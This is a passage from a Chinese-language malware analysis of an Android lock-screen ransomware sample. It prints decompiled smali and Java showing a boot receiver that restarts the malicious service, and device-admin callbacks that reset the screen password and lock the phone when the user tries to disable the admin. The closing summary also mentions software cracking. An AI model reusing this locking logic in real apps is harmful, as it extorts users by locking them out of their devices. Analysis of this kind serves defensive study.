    000003B4  return-void
    :3B6
    000003B6  move-exception      v15
    000003B8  move-object         v4, v15
    000003BA  goto                :3B4
              .catch Exception {:1F8 .. :3B4} :3B6
    .end method
**s服务小结** ：主要提供解锁服务和一些布局界面的设置
  * 2) 开机完成的广播接收器`bbb`
很明显，由下面的分析可以知道这是一个开机启动s服务的广播
        .method public onReceive(Context, Intent)V
            .registers 18
            .annotation system Signature
                value = {
                    "(",
                    "Landroid/content/Context;",
                    "Landroid/content/Intent;",
                    ")V"
                }
            .end annotation
            .annotation runtime Override
            .end annotation
    00000000  move-object         v0, p0
    00000002  move-object/from16  v1, p1
    00000006  move-object/from16  v2, p2  # mIntent
    0000000A  move-object         v7, v2
    0000000C  invoke-virtual      Intent->getAction()String, v7
    00000012  move-result-object  v7
    00000014  const-string        v8, "android.intent.action.BOOT_COMPLETED"
    00000018  invoke-virtual      String->equals(Object)Z, v7, v8  # mIntent.getAction.equals("android.intent.action.BOOT_COMPLETED")
    0000001E  move-result         v7
    00000020  if-eqz              v7, :66
    :24
    00000024  move-object         v7, v0
    00000026  invoke-virtual      bbb->abortBroadcast()V, v7  # this.abortBroadcast()
    0000002C  new-instance        v7, Intent
    00000030  move-object         v14, v7
    00000032  move-object         v7, v14
    00000034  move-object         v8, v14
    00000036  move-object         v9, v1
    :38
    00000038  const-string        v10, "com.cjk.s"
    0000003C  invoke-static       Class->forName(String)Class, v10  # class.forName("com.cjk.s")
    :42
    00000042  move-result-object  v10
    00000044  invoke-direct       Intent->(Context, Class)V, v8, v9, v10  # intent2 = new Intent(context, class.forName("com.cjk.s"))
    0000004A  move-object         v4, v7
    0000004C  move-object         v7, v4
    0000004E  const/high16        v8, 0x10000000
    00000052  invoke-virtual      Intent->addFlags(I)Intent, v7, v8  # intent2.addFlags(0x10000000)
    00000058  move-result-object  v7
    0000005A  move-object         v7, v1
    0000005C  move-object         v8, v4
    0000005E  invoke-virtual      Context->startService(Intent)ComponentName, v7, v8  # startService(intent2)
    00000064  move-result-object  v7
    :66
    00000066  return-void
  * 3)设备管理员激活时的广播接收器
一旦用户点击确认激活设备管理器，首先执行onEnabled方法，重置锁屏密码，然后触发密码更改后调用的方法onPasswordChanged，进行了锁屏行为，并且在用户想要解除该设备管理员身份的时候也会进行锁屏行为
        .method public onEnabled(Context, Intent)V
            .registers 22
            .annotation system Signature
                value = {
                    "(",
                    "Landroid/content/Context;",
                    "Landroid/content/Intent;",
                    ")V"
                }
            .end annotation
            .annotation runtime Override
            .end annotation
    00000000  move-object/from16  v0, p0
    00000004  move-object/from16  v1, p1
    00000008  move-object/from16  v2, p2
    0000000C  move-object         v11, v1
    0000000E  invoke-virtual      Context->getResources()Resources, v11
    00000014  move-result-object  v11
    00000016  const               v12, 0x7F060002
    0000001C  invoke-virtual      Resources->openRawResource(I)InputStream, v11, v12
    00000022  move-result-object  v11
    00000024  move-object         v4, v11
    00000026  move-object         v11, v4
    00000028  invoke-static       BAH->getString(InputStream)String, v11  # BAH.getString(context.getResources().openRawResource(0x7f060002))
    0000002E  move-result-object  v11
    00000030  move-object         v5, v11
    00000032  move-object         v11, v5
    00000034  const-string        v12, "\n"
    00000038  const-string        v13, ""
    0000003C  invoke-virtual      String->replaceAll(String, String)String, v11, v12, v13
    00000042  move-result-object  v11
    00000044  move-object         v6, v11
    00000046  move-object         v11, v6
    00000048  invoke-static       DU->getsss(String)String, v11  # passwd = DU.getsss(BAH.getString(context.getResources().openRawResource(0x7f060002)).replace("\n", ""))
    0000004E  move-result-object  v11
    00000050  move-object         v7, v11
    00000052  new-instance        v11, Intent
    00000056  move-object/from16  v18, v11
    0000005A  move-object/from16  v11, v18
    0000005E  move-object/from16  v12, v18
    00000062  move-object         v13, v1
    :64
    00000064  const-string        v14, "com.cjk.s"
    00000068  invoke-static       Class->forName(String)Class, v14
    :6E
    0000006E  move-result-object  v14
    00000070  invoke-direct       Intent->(Context, Class)V, v12, v13, v14  # intent = new Intent(Class.forName("com.cjk.s"))
    00000076  move-object         v8, v11
    00000078  move-object         v11, v8
    0000007A  const/high16        v12, 0x10000000
    0000007E  invoke-virtual      Intent->setFlags(I)Intent, v11, v12
    00000084  move-result-object  v11
    00000086  move-object         v11, v1
    00000088  move-object         v12, v8
    0000008A  invoke-virtual      Context->startService(Intent)ComponentName, v11, v12  # startService(intent)
    00000090  move-result-object  v11
    00000092  move-object         v11, v0
    00000094  move-object         v12, v1
    00000096  invoke-virtual      MyAdmin->getManager(Context)DevicePolicyManager, v11, v12  # this.getManager(context)
    0000009C  move-result-object  v11
    0000009E  move-object         v12, v7
    000000A0  const/4             v13, 0
    000000A2  invoke-virtual      DevicePolicyManager->resetPassword(String, I)Z, v11, v12, v13  # this.getManager(context).resetPassword(passwd, 0)
    000000A8  move-result         v11
    000000AA  move-object         v11, v0
    000000AC  move-object         v12, v1
    000000AE  move-object         v13, v2
    000000B0  invoke-super        DeviceAdminReceiver->onEnabled(Context, Intent)V, v11, v12, v13
    000000B6  return-void
代码大致相同，不再赘述
        @Override public void onPasswordChanged(Context arg13, Intent arg14) {
          String v7 = DU.getsss(BAH.getString(arg13.getResources().openRawResource(0x7F060002)).replaceAll("\n", ""));
          this.getManager(arg13).lockNow();
          this.getManager(arg13).resetPassword(v7, 0);
          super.onPasswordChanged(arg13, arg14);
      }
      @Override public CharSequence onDisableRequested(Context arg13, Intent arg14) {
          String v7 = DU.getsss(BAH.getString(arg13.getResources().openRawResource(0x7F060002)).replaceAll("\n", ""));
          this.getManager(arg13).lockNow();
          this.getManager(arg13).resetPassword(v7, 0);
          return super.onDisableRequested(arg13, arg14);
      }
  * 4) 启动Activity  
主要在oncreate方法中，调用了开启激活设备管理员的界面
        .method private activiteDevice()V
            .registers 15
            .annotation system Signature
                value = {
                    "()V"
                }
            .end annotation
    00000000  move-object         v0, p0
    00000002  new-instance        v6, Intent
    00000006  move-object         v13, v6
    00000008  move-object         v6, v13
    0000000A  move-object         v7, v13
    0000000C  const-string        v8, "android.app.action.ADD_DEVICE_ADMIN"
    00000010  invoke-direct       Intent->(String)V, v7, v8  # intent = new Intent("android.app.action.ADD_DEVICE_ADMIN")
    00000016  move-object         v2, v6
    00000018  new-instance        v6, ComponentName
    0000001C  move-object         v13, v6
    0000001E  move-object         v6, v13
    00000020  move-object         v7, v13
    00000022  move-object         v8, v0
    :24
    00000024  const-string        v9, "com.cjk.MyAdmin"
    00000028  invoke-static       Class->forName(String)Class, v9  # Class.forName("com.cjk.MyAdmin")
    :2E
    0000002E  move-result-object  v9
    00000030  invoke-direct       ComponentName->(Context, Class)V, v7, v8, v9  # mConponent = new ComponentName(this, Class.forName("com.cjk.MyAdmin"))
    00000036  move-object         v3, v6
    00000038  move-object         v6, v2
    0000003A  const-string        v7, "android.app.extra.DEVICE_ADMIN"
    0000003E  move-object         v8, v3
    00000040  invoke-virtual      Intent->putExtra(String, Parcelable)Intent, v6, v7, v8  # intent.putExtra("android.app.extra.DEVICE_ADMIN", mConponent)
    00000046  move-result-object  v6
    00000048  move-object         v6, v0
    0000004A  move-object         v7, v2
    0000004C  const/4             v8, 0
    0000004E  invoke-virtual      M->startActivityForResult(Intent, I)V, v6, v7, v8  # startActivityForResult(intent, 0)
# 总结
至此，基本全部分析完毕，主要在这个分析的过程中来了解smali语法，当编译成java的语法出错时可以看汇编代码，当然也可以尝试进行一些软件破解行为。
# 参考
> google官方smali语法  bytecode>  
>  Dalvik opcodes   
>  深入理解Dalvik字节码指令及Smali文件
> 